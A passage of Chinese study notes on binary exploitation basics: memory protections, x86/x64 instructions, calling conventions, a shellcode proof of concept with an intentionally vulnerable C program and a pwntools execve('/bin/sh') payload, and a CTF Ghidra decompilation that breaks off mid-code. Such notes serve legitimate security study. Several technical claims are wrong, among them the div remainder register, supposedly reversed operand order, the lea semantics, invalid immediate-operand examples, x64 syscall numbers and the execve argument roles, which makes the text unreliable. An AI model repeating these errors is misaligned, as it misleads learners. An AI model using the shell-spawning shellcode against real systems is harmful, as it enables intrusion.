        - RELRO 是一種保護機制，用於保護程式的全局變量和函數位址不被修改。RELRO 通過在程式**執行期間**將這些變量和函數的位址**設置為只讀**，以防止攻擊者修改它們的值。

    - Seccomp → secure computing mode
        - 制定規則來禁止/允許呼叫特定的syscall
        - Seccomp 是一種 Linux 內核功能，用於**限制程式執行時可以使用的系統呼叫**。可以用來**限制程式對系統的訪問**，以防止攻擊者利用系統呼叫來破壞系統或獲得未授權的訪問。

    - ASLR → Address Space Layout Randomization
        - ASLR 是一種保護機制，用於**隨機化程式在記憶體中的位址**。這使得攻擊者更難推斷出程式的記憶體位址，因此使得程式更難被破壞。
        - 程式載入時，stack、heap等記憶體區塊會使用**隨機的位址**作為base address

            [記憶體結構](https://hackmd.io/@SY-T/HkiQTyxpa)

            - 在一定的範圍中隨機
            - 未12bits是固定的，每次載入時都不會更動

    checksec 能看執行檔採用的安全防護

    ![Untitled](img/pwn_Untitled_6.png)

    ### x64 -Basic

    在x86指令集中，以&quot;e&quot;開頭的註冊通常是32位元註冊。例如，eax、ebx、ecx、edx、esi、edi等都是32位元註冊。

    在x86指令集中，還有一些64位元註冊以&quot;r&quot;開頭，例如rax、rbx、rcx、rdx、rsi、rdi等。

    - Based on x86 的指令集
    - Logical address 用8bytes來代表，不過並不是整個記憶體位址都會使用到:
        - User space -    0x0000**0000**0000**0000** (0) ~ 0x0000**7FFF**FFFF**FFFF** (2^47 - 1)
        - Kernel space - 0xFFFF**8000**0000**0000** (2^64 - 2^47) ~ 0xFFFF**FFFF**FFFF**FFFF** (2^64 - 1)
    - 原本x86 register 擴展到64 bits: rax, rbx, rcx, rdx, rsp, rbp, rip, …
    - 比x86有更多的register: r8 ~ r15

    rsp 的s→ stack , p→ pointr

    rbp2k

    x86 指令集包含許多不同的指令，用於執行各種各樣的操作。下面是一些常見的 x86 指令：

    **在x86架構下，第一個操作數是後面的操作數，第二個操作數是前面的操作數。**

    通常情況下，第一個操作數是目標，第二個操作數是源。但是，有一些指令的操作數的順序與這個規則不同。

    - `mov`：將數據從一個地址**移動**到另一個地址。
        - `mov eax, 5`; 將數字5儲存到eax中
        `mov [ebx], eax`; 將eax的值存儲到ebx指向的地址中
    - `add`：將兩個數**相加**並將結果存儲回去。
        - `add eax, 5` ; 將eax的值**加上**数字5，結果存儲在eax中
    - `sub`：將兩個數**相減**並將結果存儲回去。
        - `sub eax, 5` ; 将eax的值**減去**数字5，結果存儲在eax中
    - `mul`：將兩個數**相乘**並將結果存儲回去。
        - `mul ebx` ; 将eax的值**乘上**ebx的值，結果存儲在eax中
    - `div`：將一個數**除以**另一個數並將結果存儲回去。
        - `div ebx` ; 將eax的值**除以**ebx的值，**商存儲**在eax中，**餘數**存儲在ebx中
    - `inc`：將**數值加 1**。
        - `inc eax` ; 将eax註冊的值加1
    - `dec`：將**數值減 1**。
        - `dec eax` ; 将eax註冊的值减1
    - `and`：將兩個數按位**and**並將結果存儲回去。
        - `and eax, ebx` ; 將eax註冊和ebx註冊的值進行**邏輯與運算**，結果存儲在eax中
    - `or`：將兩個數按位**or**併將結果存儲回去。
        - `or eax, ebx` ; 將eax註冊和ebx註冊的值進行**邏輯與運算**，結果存儲在eax中
    - `xor`：將兩個數按位**互斥或**併將結果存儲回去。
        - `xor eax, ebx` ; 將eax註冊和ebx註冊的值進行**邏輯互斥或**運算，結果存在eax中
    - `not`：將數值按位**取反**。
        - `not eax` ; 将eax註冊的值的每一位取反
    - `shl`：將數值**左移**一位（等價於乘以 2）。
    - `shr`：將數值**右移**一位（等價於除以 2）。
    - `push`：將數值**推入堆棧頂**。
        - `push eax` ; 将eax註冊的值压入堆栈中
    - `pop`：從**堆棧頂彈出數**值。
        - `pop ebx` ; 将堆栈頂部的數字弹出堆栈，並存儲到ebx註冊中
    - `call`：**調用函數**並將返回地址壓入堆棧。
        - `call function` ; 呼叫程序中名為&quot;function&quot;的函數。操作數的順序與通常情況下的規則相反。
    - `ret`：從**堆棧中彈出**返回地址並跳轉到該地址。
    - `jmp`：**無條件跳轉**到指定地址。
        - `jmp label`; 跳轉到程序中名為&quot;label&quot;的位置。操作數的順序與通常情況下的規則相反。
    - `je`：如果**相等**則跳轉。
    - `jne`：如果**不相等**則跳轉。
    - `jg`：如果**大於**則跳轉。
    - `jge`：如果**大於等於**則跳轉。
    - `jl`：如果**小於**則跳轉。
    - `jle`：如果**小於等於**則跳轉。
    - `cmp`：**比較兩個數**並設置標誌位。兩數值不會被覆寫
        - `cmp eax, ebx` ; 比較eax註冊和ebx註冊的值的大小，設置一個標志
        - cmp指令是用於**比較兩個數字的大小**的指令。當兩個數字不等時，它會設置一個標志，這個標志可以用於**控制程序流程**。

            <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mov eax, <span class="number">5</span></span><br><span class="line">mov ebx, <span class="number">10</span></span><br><span class="line">cmp eax, ebx</span><br><span class="line"></span><br><span class="line">cmp指令的第一個操作數是eax，第二個操作數是ebx。</span><br><span class="line">cmp指令是比較eax和ebx的值的大小。在這個例子中，eax的值是<span class="number">5</span>，ebx的值是<span class="number">10</span>。</span><br><span class="line">因此，cmp指令會比較eax和ebx的值，並設置一個標志。</span><br></pre></td></tr></table></figure>

    - `test`：比較兩個操作數的值的位元**是否相同**的指令，並設置標誌位。
        - `test eax, ebx`; test指令比較兩個操作數的值，並設置一個標志。操作數的順序與通常情況下的規則相反。

            <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例如，你可以使用以下命令來測試兩個數字的值的位元是否相同:</span><br><span class="line"></span><br><span class="line">test 5, 10</span><br><span class="line"></span><br><span class="line">你也可以使用以下命令來測試兩個註冊的值的位元是否相同:</span><br><span class="line"></span><br><span class="line">mov eax, 5</span><br><span class="line">mov ebx, 10</span><br><span class="line">test eax, ebx</span><br><span class="line"></span><br><span class="line">你還可以使用以下命令來測試兩個註冊指向的地址的值的位元是否相同:</span><br><span class="line"></span><br><span class="line">mov eax, [address1]</span><br><span class="line">mov ebx, [address2]</span><br><span class="line">test eax, ebx</span><br></pre></td></tr></table></figure>

    - `lea`: **獲取指针的地址或者獲取數組元素的地址**，而不是用於計算數學運算。
        - `lea eax, [ebx]` ; lea指令會計算ebx指向的地址的值，並將該值存儲到eax註冊中。假設ebx註冊指向的地址存儲的值是100，那麼lea指令會將100存儲到eax註冊中。
        - `lea eax, [ebx+4]`; lea指令會計算**ebx指向的地址加上4**的值，並將該值存儲到eax中。
    - `xchg`: 用於**交換兩個操作數的值**的指令。它的操作數的順序也與通常情況下的規則相反。
        - `xchg eax, ebx`;

            <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">例如，你可以使用以下命令來交換兩個數字的值:</span><br><span class="line"></span><br><span class="line">xchg 5, 10</span><br><span class="line"></span><br><span class="line">你也可以使用以下命令來交換兩個註冊的值:</span><br><span class="line"></span><br><span class="line">mov eax, 5</span><br><span class="line">mov ebx, 10</span><br><span class="line">xchg eax, ebx</span><br><span class="line"></span><br><span class="line">你還可以使用以下命令來交換兩個註冊指向的地址的值:</span><br><span class="line"></span><br><span class="line">mov eax, [address1]</span><br><span class="line">mov ebx, [address2]</span><br><span class="line">xchg eax, ebx</span><br><span class="line"></span><br><span class="line">xchg指令會交換eax和ebx註冊的值。</span><br><span class="line">在這個例子中，假設eax註冊的值是5，ebx註冊的值是10，</span><br><span class="line">那麼交換後，eax註冊的值將變為10，ebx註冊的值將變為5。</span><br><span class="line"></span><br><span class="line">在使用xchg指令時，你需要注意不要丟失重要的數據。</span><br><span class="line">例如，假設你正在使用xchg指令來交換兩個註冊的值，</span><br><span class="line">但是你忘記了將其中一個註冊的值存儲到其他地方，</span><br><span class="line">那麼你就有可能丟失重要的數據。</span><br><span class="line"></span><br><span class="line">此外，你需要注意xchg指令可能會影響程序的性能。</span><br><span class="line"></span><br><span class="line">例如，如果你的程序需要頻繁地交換兩個註冊的值，</span><br><span class="line">那麼使用xchg指令可能會降低程序的性能。</span><br></pre></td></tr></table></figure>


    label

    - 非必要
    - 標籤至變數之前

    資料標籤 data label

    - 標記一個變數位置
    - count DWORD 100

    程式碼標籤

    - 必須以冒號(:)結尾

    <figure class="highlight basic"><table><tr><td class="code"><pre><span class="line">L1:</span><br><span class="line">	add eax,<span class="number">1</span></span><br><span class="line">	jmp L1</span><br></pre></td></tr></table></figure>

    Big/Little Endian

    ![Untitled](img/pwn_Untitled_7.png)

    ### x64 - Register

    - rax → 存放 function 回傳的結果，可用於存儲函數的返回值或執行算術運算。
    - rsp → 指向 stack 的頂端，堆棧指針註冊
    - rbp → 指向 stack 底端，基準指針註冊，用於存儲當前函數的堆棧帧基準地址。
    - rip → 下個要執行的instruction位址，指令指針註冊，用於存儲當前執行的指令地址。

    ![Untitled](img/pwn_Untitled_8.png)

    ### x64 - Calling Convention

    - 可想像成是一種protocol，定義了:
        - Function 如何傳遞參數
        - Syscall 如何傳遞參數

            [stack frame](https://hackmd.io/@SY-T/BkTT3kgpa)

            - Syscall是一個x86指令，**它允許程序調用操作系統的服務**。通常情況下，程序可以通過調用操作系統的服務來完成許多不同的操作，例如讀取文件、寫入文件、建立網絡連接等等。

            使用Syscall指令時，你需要**將系統调用的編號存儲在eax**註冊中，**然後調用Syscall指令**。操作系統會根據eax註冊中的值來執行相應的服務。

            例如，你可以使用以下命令來調用操作系統的終止進程服務:

                <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax, 1</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

                在這個例子中，**eax註冊的值是1，這表示調用終止進程服務**。當你調用Syscall指令時，操作系統會執行終止進程服務。

                此外，你還可以使用Syscall指令調用其他的操作系統服務。例如，你可以使用以下命令來調用操作系統的讀取文件服務:

                <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax, 2</span><br><span class="line">mov ebx, file_descriptor</span><br><span class="line">mov ecx, buffer</span><br><span class="line">mov edx, size</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

                在這個例子中，**eax註冊的值是2，這表示調用讀取文件服務**。其他的註冊（ebx、ecx、edx）存儲了讀取文件所需的參數。當你調用Syscall指令時，操作系統會執行讀取文件服務。

        - Caller 與 Callee各自的責任

            ![Untitled](img/pwn_Untitled_9.png)

            function call是一種程序語言中的語法，**用於調用函數**。函數是程序中的一段可**重複使用的代碼**，**它可以被多個地方調用**。函數可以接受參數，並且可以返回一個結果。他1~6個參數通過register傳遞，超過6個參數就會通過stack傳遞

            在x86中，function call調用的順序是先將函數的參數压入堆棧，然後將函數的地址压入堆棧，最後調用call指令跳轉到函數。

            例如，在C語言中，你可以使用以下語法調用函數:

            result = function_name(arg1, arg2, ...);

            在這個例子中，function_name是函數的名稱，arg1、arg2等是函數的參數，result是函數的返回值。

            Syscall是一個x86指令，它**允許程序調用操作系統的服務**。通常情況下，程序可以通過調用**操作系統的服務來完成許多不同的操作**，例如讀取文件、寫入文件、建立網統連接等等。

            使用Syscall指令時，你需要將系統调用的編號存儲在eax註冊中，然後調用Syscall指令。操作系統會根據eax註冊中的值來執行相應的服務。

            他會在rax放入一個syscall number，此外第四參數也跟fun call不一樣rcx→r10，其他都一樣

        - x64 registers sizes
            - 在 x86–64 結構下，暫存器都是 64 bits = 8 bytes 大小[[5]](https://tech-blog.cymetrics.io/posts/crystal/reverse-01/#fn5)
            ，暫存器也可以部分存取，以 `rax` 為例，`eax` 指 `rax` 的後 4 bytes、再對切得到 `ax` 為倒數 2 bytes、然後再切分為 `ah` 與 `al`。

            ![Untitled](img/pwn_Untitled_10.png)

            ![Untitled](img/pwn_Untitled_11.png)
</code></pre><h3 id="x64-function-frame"><a href="#x64-function-frame" class="headerlink" title="x64 - function frame"></a>x64 - function frame</h3><p><img src="img/pwn_Untitled_12.png" alt="Untitled"></p>
<ul>
<li>每個Function 在執行期間，stack中會有一塊空間負責記錄當前function的執行狀態，而該空間稱為Function frame，保存的狀態像是:<ul>
<li>當前function使用的變數</li>
<li>呼叫其他function時傳遞的參數</li>
</ul>
</li>
<li>Calling convention<ul>
<li>caller儲存回去的位址</li>
<li>callee儲存舊的function frame位址</li>
</ul>
</li>
</ul>
<p>x64 - Function frame - Prologue / Epilogue</p>
<ul>
<li><p>在fun 的頭尾會有一些用來處理stack frame的指令</p>
<ul>
<li><p>頭: Prologue</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push rbp</span><br><span class="line">mov rbp,rsp</span><br><span class="line">sub rsp,xxh</span><br></pre></td></tr></table></figure>
</li>
<li><p>尾: Epilogue</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">leave =&gt; mov rsp,rbp</span><br><span class="line">				 pop rbp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<p>Prologue是指<strong>函數執行前</strong>的一段代碼，它會負責<strong>建立堆棧帧並初始化所需的資訊</strong>。</p>
<p>在x64指令集中，Prologue通常會包含以下指令：</p>
<ul>
<li>push rbp: 將當前的rbp值压入堆棧</li>
<li>mov rbp, rsp: 將當前的rsp值複製到rbp中，作為新的基準地址</li>
<li>sub rsp, imm: 從rsp中減去一個數值，用來為局部變數預留空間</li>
</ul>
<p>Epilogue是指<strong>函數執行完畢</strong>後的一段代碼，它會負責<strong>清除堆棧帧並返回結果</strong>。</p>
<p>在x64指令集中，Epilogue通常會包含以下指令：</p>
<ul>
<li>mov rsp, rbp: 將rbp的值複製回rsp，恢復堆棧的狀態</li>
<li>pop rbp: 將堆棧頂端的值弹出，作為新的rbp值</li>
<li>ret: 返回至調用函數的地址</li>
</ul>
<p>Prologue和Epilogue是函數執行流程中不可或缺的部分，它們有助於<strong>保證函數的正確性和效率</strong>。</p>
<ul>
<li><p>補充</p>
<p>  rip → 下條要執行的指令</p>
</li>
</ul>
<p><img src="img/pwn_Untitled_13.png" alt="Untitled"></p>
<p><img src="img/pwn_x86_exec.drawio.png" alt="x86 exec.drawio.png"></p>
<h3 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h3><ul>
<li>Explanation - 指攻擊者可以透過程式漏洞，將能控制到的data以指令的方式來執行<ul>
<li>Binary 為一連串的assembly instruction 組合而成，如果攻擊者可以再擁有<strong>執行+寫入</strong>權限的區段寫入一連串的instruction，控制執行流程到該區塊時<strong>就能執行shellcode</strong></li>
</ul>
</li>
<li>Precondition - 能控制到區塊的權限必須為rwx or -wx 才可寫入並執行</li>
</ul>
<p><img src="img/pwn_Untitled_14.png" alt="Untitled"></p>
<ul>
<li>安裝pwntool</li>
<li>圖一中 asm是Python中的一個模塊，它可以將AT&amp;T格式的汇编語言代碼轉換為機器碼。這個模塊可以方便地在Python程序中使用汇编語言。</li>
<li>產生出的shellcode，在C建立chararray</li>
<li>func_ptr指向shellcode位址(sc)，用call func方式呼叫shellcode</li>
<li>gcc -z execstack -o test test.c</li>
</ul>
<h3 id="Shellcode-POC"><a href="#Shellcode-POC" class="headerlink" title="Shellcode POC"></a>Shellcode POC</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> shellcode[<span class="number">0x30</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Give me shellcode: &quot;</span>);</span><br><span class="line"></span><br><span class="line">    read(<span class="number">0</span>, shellcode, <span class="number">0x30</span>);</span><br><span class="line">    ((<span class="type">void</span>(*)(<span class="type">void</span>))shellcode)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>setvbuf函数用于设置流的缓冲区，第一个参数指定要设置的流(stdin、stdout)，第二个参数指定缓冲区的内存地址，第三个参数指定缓冲区的类型(_IONBF)，第四个参数指定缓冲区的大小。</p>
<p>在这个程式中，<strong>setvbuf函数的第二个参数设置为0</strong>，这表示使用<strong>系统默认的缓冲区</strong>。第三个参数设置为<strong>_IONBF</strong>，这表示设置为<strong>无缓冲类型</strong>，即直接输出到设备。第四个<strong>参数设置为0，</strong>这表示<strong>缓冲區大小为0</strong>，也就是<strong>禁用缓冲区</strong>。因此，這行程式的作用是将<strong>stdin流的缓冲区设置为无缓冲，即直接输出到设备</strong>。</p>
<p>然后，程式定义了一个字符数组shellcode，大小为0x30(48)个字节。接着，使用printf函数向标准输出输出”Give me shellcode: “字符串。</p>
<p>最后，使用read函数从标准输入读入0x30(48)个字节的数据到shellcode数组中。然后，使用强制类型转换将shellcode数组转换为函数指针，并调用该函数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char shellcode[0x30] 已經在記憶體中配置了 0x30 (48) 個字節的空間，用於儲存字符數據。</span><br><span class="line"></span><br><span class="line">而 read 函數中的第三個參數 0x30，則是指定讀入數據的長度。也就是讀入多少個字節的數據到 shellcode 數組中。</span><br><span class="line"></span><br><span class="line">這兩個參數的意義是不同的，**前者是為 shellcode 數組分配多少個字節的空間，而後者則是指定讀入多少個字節的數據到 shellcode 數組中。**</span><br><span class="line"></span><br><span class="line">通常我們需要確保讀入的數據長度不超過 shellcode 數組的大小，以防止越界訪問，導致程式 crash 或者其他安全問題。</span><br></pre></td></tr></table></figure>
<p>在C语言中，函数指针是一种指向函数的指针。<strong>函数指针的类型</strong>是由函数的<strong>返回值类型和参数类型决定</strong>的。在这段代码中，使用函数指针调用函数的语法如下：</p>
<p>((函数指针类型)(函数指针))(函数参数);</p>
<p>在这个代码中，shellcode数组的类型是char<em>，而**函数指针的类型是void(</em>)(void)，也就是一个无返回值**，无参数的函数指针。所以，需要使用强制类型转换将shellcode数组转换为函数指针。</p>
<p>最后，使用函数指针调用该函数即可。</p>
<p>如果不將 shellcode 數組轉換成函數指針，並直接呼叫它，那麼程式將會執行 shellcode 數組中的字符串，而不是執行它所指向的函數。</p>
<p>這可能導致程式崩潰或其他未預期的錯誤。</p>
<p>另外若未進行強制轉換，而在原本設置的char shellcode[0x30]的空間中執行的是字符陣列，可能會被當成字串處理而不是可執行的程式碼.</p>
<p>所以, 要將 shellcode 數組轉換成函數指針並呼叫它，是為了確保程式正確執行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span> <span class="comment"># 導入 pwn 庫，並設置目標程序為 64 位元</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>] <span class="comment"># 設置使用 tmux 來啟動終端，並在横向分割視窗下運行</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./demo_shellcode&#x27;</span>)<span class="comment"># 啟動名為 demo_shellcode 的程序，並將它與 Python 代碼連接</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># execve(&quot;/bin/sh&quot;, 0, 0)</span></span><br><span class="line">sc = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rax, 0x3b  #使用 mov 指令將值 0x3b 儲存在 rax 寄存器中，這個值對應到 execve() 系統調用。</span></span><br><span class="line"><span class="string">xor rsi, rsi   #使用 xor 指令將 rsi 寄存器的值設置為0，這是 execve() 系統調用的第二個參數，表示環境變量的地址。</span></span><br><span class="line"><span class="string">xor rdx, rdx   #使用 xor 指令將 rdx 寄存器的值設置為0，這是 execve() 系統調用的第三個參數，表示傳遞給新程序的命令列參數的地址。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 0x68732f6e69622f  #使用 mov 指令將值 0x68732f6e69622f 儲存在 rdi 寄存器中，這是 &#x27;/bin/sh&#x27; 的 ASCII 碼的反組合，</span></span><br><span class="line"><span class="string">mov qword ptr [rbp], rdi   #將 rdi 寄存器中的值儲存到 rbp 指向的記憶體位址中，也就是將 &quot;/bin/sh&quot; 放入記憶體中</span></span><br><span class="line"><span class="string">mov rdi, rbp               #使用 mov 指令將 rbp 的值存入 rdi, 這樣可以讓 rdi 指向記憶體中的 &quot;/bin/sh&quot;</span></span><br><span class="line"><span class="string">syscall  #呼叫 execve() 系統調用，並且使用之前在寄存器中設置的參數，從而執行 &quot;/bin/sh&quot;。  execve(&quot;/bin/sh&quot;, 0, 0)。</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">使用 asm 函數將指定的 assembly 程式碼轉換為字節碼。</span></span><br><span class="line"><span class="string">這裡定義了一個名為 sc 的字節數組，其中存儲了一段 shellcode,</span></span><br><span class="line"><span class="string">這段 shellcode 包括了使用 syscall 指令呼叫 execve() 的操作，參數是 &quot;/bin/sh&quot;, 0, 0 。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">在程序中通過將 shellcode 數組轉換為函數指針並呼叫它，就能執行這段 shellcode 的程式碼。</span></span><br><span class="line"><span class="string">並且因為 execve() 系統調用會開啟一個新的 shell，所以在這段程式碼執行之後，使用者將能夠在新的 shell 中進行操作。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(sc) &lt;= <span class="number">0x30</span>) <span class="comment">#使用 assert() 函數，檢查 sc 的長度是否小於等於0x30，若不是就會產生一個錯誤。</span></span><br><span class="line"></span><br><span class="line">gdb.attach(r) <span class="comment"># 使用 gdb.attach() 函數，與 r 連接的程序 (demo_shellcode) 附加到 GDB 调试器。</span></span><br><span class="line">r.sendafter(<span class="string">&quot;Give me shellcode: &quot;</span>, sc)<span class="comment"># 通過 sendafter() 函數，在等待 &quot;Give me shellcode: &quot; 後進行輸入，將 sc 字節數組中的內容發送到程序中。</span></span><br><span class="line"></span><br><span class="line">r.interactive() <span class="comment">#使用 interactive() 函數，啟動交互式的輸入輸出，將控制台的輸入和輸出與程序連接起來。 在這個狀態下，使用者可以與程序互動，控制程序的流程。</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">總的來說, 這個程式的主要功能為使用交互式方式執行，通過GDB调试器附加到一個名為 demo_shellcode 的程式</span></span><br><span class="line"><span class="string">並將可執行的程式碼傳入到程式中執行，進而得到一個可操作shell。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>./demo_shellcode.py →進入gdb以及開啟</li>
</ul>
<h2 id="gdb-poc"><a href="#gdb-poc" class="headerlink" title="gdb poc"></a>gdb poc</h2><ul>
<li>先編譯c<ul>
<li>gcc -z execstack -o test test.c</li>
</ul>
</li>
<li><p>執行gdb</p>
<ul>
<li>gdb file</li>
<li>disas main</li>
<li>b main<ul>
<li>b *addr</li>
</ul>
</li>
<li>r</li>
<li>c</li>
<li>si</li>
<li>ni</li>
<li><p>秀記憶體位址</p>
<ul>
<li>在gef的stack區塊看到+0x0000、+0x0008…+0x0038的資訊</li>
<li><p>想往後看記憶體位置時，因當前沒有看到想看到的位址資訊</p>
<p>  <img src="img/pwn_Untitled_15.png" alt="Untitled"></p>
</li>
<li><p>最後一行是+0x0038</p>
<ul>
<li>x/1xg 0x007fffffffe280<ul>
<li>他會顯示0x7fffffffe280: 0x0000000000000000</li>
</ul>
</li>
<li><p>x/8xg 0x007fffffffe280</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x7fffffffe280: 0x0000000000000000      0x00007ffff7ffdad0</span><br><span class="line">0x7fffffffe290: 0x0000000000000001      0x00007ffff7df118a</span><br><span class="line">0x7fffffffe2a0: 0x00007fffffffe390      0x0000555555555159</span><br><span class="line">0x7fffffffe2b0: 0x0000000155554040      0x00007fffffffe3a8</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code>NISRA_pwn0_gdb

- 先用ghidra開啟檔案

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>.(<span class="type">char</span> *)<span class="number">0x0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	get_flag();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

在x86組合語言中，**cmp指令是用來比較兩個數值的指令，它會將兩個操作數相減**，然後根據結果設置標誌位（也就是EFLAGS寄存器中的標誌位），而不會修改操作數本身。cmp指令的語法是&quot;cmp dest, src&quot;，其中dest是目的操作數，src是源操作數。

在&quot;cmp edx, eax&quot;這條指令中，edx和eax分別是操作數，它們會被相減，然後根據結果設置標誌位。如果edx等於eax，那麼相減的結果為0，因此ZF（零標誌位）會被設置為1，表示相等；否則ZF會被設置為0，表示不相等。在代碼的後面可能有一條jz（jump if zero）指令，它會根據ZF的值決定是否跳轉。如果ZF為1，代表edx等於eax，那麼跳轉指令就會被執行，否則程序就會繼續執行下去。

因此，如果你希望在cmp edx, eax之後繞過代碼，你需要讓edx等於eax，這樣ZF才會被設置為1，跳轉指令才會被執行。如果edx不等於eax，那麼ZF就會被設置為0，代碼就不會被繞過。

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">get_flag</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  ulong uVar1;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">int</span> local_7c;</span><br><span class="line">  <span class="type">int</span> local_78;</span><br><span class="line">  <span class="type">int</span> local_74;</span><br><span class="line">  uint local_70;</span><br><span class="line">  <span class="type">int</span> local_6c;</span><br><span class="line">  undefined8 local_68;</span><br><span class="line">  undefined8 local_60;</span><br><span class="line">  undefined8 local_58;</span><br><span class="line">  undefined4 local_50;</span><br><span class="line">  undefined2 local_4c;</span><br><span class="line">  undefined local_4a;</span><br><span class="line">  undefined8 local_48;</span><br><span class="line">  undefined8 local_40;</span><br><span class="line">  undefined8 local_38;</span><br><span class="line">  undefined8 local_30;</span><br><span class="line">  undefined8 local_28;</span><br><span class="line">  undefined8 local_20;</span><br><span class="line">  undefined2 local_18;</span><br><span class="line">  undefined local_16;</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  local_68 = <span class="number">0x756f795f65766148</span>;</span><br><span class="line">  local_60 = <span class="number">0x65685f726576655f</span>;</span><br><span class="line">  local_58 = <span class="number">0x756f62615f647261</span>;</span><br><span class="line">  local_50 = <span class="number">0x64675f74</span>;</span><br><span class="line">  local_4c = <span class="number">0x3f62</span>;</span><br><span class="line">  local_4a = <span class="number">0</span>;</span><br><span class="line">  local_48 = <span class="number">0x100b021e37252806</span>;</span><br><span class="line">  local_40 = <span class="number">0x54372d170211103d</span>;</span><br><span class="line">  local_38 = <span class="number">0x25f123e30172d12</span>;</span><br><span class="line">  local_30 = <span class="number">0x2631600e11012d11</span>;</span><br><span class="line">  local_28 = <span class="number">0x3c44024d311c123e</span>;</span><br><span class="line">  local_20 = <span class="number">0x8361133460b423a</span>;</span><br><span class="line">  local_18 = <span class="number">0x1901</span>;</span><br><span class="line">  local_16 = <span class="number">0x5f</span>;</span><br><span class="line">  local_6c = open(<span class="string">&quot;/dev/urandom&quot;</span>,<span class="number">0</span>);</span><br><span class="line">  read(local_6c,&amp;local_7c,<span class="number">4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me maigc :&quot;</span>);</span><br><span class="line">  __isoc99_scanf(&amp;DAT_00402021,&amp;local_78);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (local_7c == local_78) &#123;</span><br><span class="line">    local_74 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (local_70 = <span class="number">0</span>; local_70 &lt; <span class="number">0x33</span>; local_70 = local_70 + <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="built_in">putchar</span>((<span class="type">int</span>)(<span class="type">char</span>)(*(byte *)((<span class="type">long</span>)&amp;local_48 + (<span class="type">long</span>)(<span class="type">int</span>)local_70) ^</span><br><span class="line">                         *(byte *)((<span class="type">long</span>)&amp;local_68 + (<span class="type">long</span>)local_74)));</span><br><span class="line">      local_74 = local_74 + <span class="number">1</span>;</span><br><span class="line">      uVar1 = (ulong)(<span class="type">long</span>)local_74 / <span class="number">0x1f</span>;</span><br><span class="line">      uVar1 = ((<span class="type">long</span>)local_74 - uVar1 &gt;&gt; <span class="number">1</span>) + uVar1 &gt;&gt; <span class="number">4</span>;</span><br><span class="line">      local_74 = local_74 - ((<span class="type">int</span>)(uVar1 &lt;&lt; <span class="number">5</span>) - (<span class="type">int</span>)uVar1);</span><br><span class="line">    